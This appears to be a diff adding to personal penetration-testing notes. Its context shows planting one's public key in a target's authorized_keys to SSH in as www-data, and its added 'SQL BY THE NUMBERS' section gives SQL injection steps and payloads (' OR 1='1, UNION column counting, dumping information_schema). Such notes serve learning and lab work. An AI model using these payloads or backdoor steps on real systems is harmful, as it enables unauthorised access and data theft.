@@ -78,4 +78,19 @@ take the .ssh/id_rsa.pub and copy just the key into the previously discovered ho
 on this home folder ; mkdir <absolute path to home directory>/.ssh then echo "your copied public key" > <your home directory>/.ssh/authorized_keys
 from here you should be able to ssh straight into the target from your box using ssh -i <where your private key is(ssh_rsa)> www-data@<target box>
 
+for sql use show databases; to see all the different databases
+use show tables from session; to see tables for a given session
+select * from session.Tires; to get everything in the given table
+select tireid,name,cost from session.Tires; to get specific info for the columns
+use session; specifies a databse to step into which allows you to just specify the table you need
+
+SQL BY THE NUMBERS
+Browse website as normal & find input fields + variables
+Test each field GET and/or POST (' OR 1='1)
+find total # of columns (UNION 1,2,3....(test a lot to make sure you get the exact number of columns))
+GOLDEN STATEMENT, UNION SELECT table_schema, table_name, column_name, (plus placeholders if needed)(can change order to fit funky tables) from information_schema.columns (find useful fields to use in your custom table statement)
+Make new query based on custom tables+columns UNION SELECT <Values you found important> from CustomTable.CustomColumn;# 
+
+
+
 
